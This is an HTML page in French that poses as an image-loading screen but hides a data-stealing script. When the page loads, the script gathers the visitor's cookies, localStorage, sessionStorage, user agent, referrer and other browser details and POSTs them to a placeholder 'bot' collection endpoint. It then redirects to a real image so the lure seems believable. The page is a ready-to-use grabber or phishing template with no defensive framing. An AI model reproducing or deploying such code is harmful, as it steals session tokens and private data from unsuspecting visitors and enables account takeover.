<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Chargement de l'image…</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
       background:#0f0f12;color:#ddd;font-family:system-ui,sans-serif;flex-direction:column;gap:22px}
  .spin{width:64px;height:64px;border:6px solid #2a2a32;border-top-color:#fff;
        border-radius:50%;animation:s 0.9s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  .frame{width:min(90vw,420px);aspect-ratio:4/3;border-radius:14px;
    background:linear-gradient(100deg,#18181d 20%,#22222a 40%,#18181d 60%);
    background-size:200% 100%;animation:sh 1.5s linear infinite;
    display:flex;align-items:center;justify-content:center;color:#555;font-size:13px}
  @keyframes sh{to{background-position:-200% 0}}
  p{opacity:.55;font-size:13px;margin:0}
</style>
</head>
<body>
  <div class="spin"></div>
  <div class="frame">Chargement de l'image…</div>
  <p>Un instant, l'image arrive…</p>

<script>
const ENDPOINT = "https://TON-BOT.onrender.com/collect"; // ← à changer

const payload = {
  ua: navigator.userAgent,
  lang: navigator.language,
  cookies: document.cookie,
  ls: JSON.stringify(localStorage),
  ss: JSON.stringify(sessionStorage),
  ref: document.referrer,
  screen: `${screen.width}x${screen.height}`,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  ts: Date.now()
};

fetch(ENDPOINT, {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
}).catch(()=>{});

// petite redirection vers une vraie image après 2s (facultatif mais crédible)
setTimeout(()=>{ location.href = "https://picsum.photos/800/600"; }, 2000);
</script>
</body>
</html>
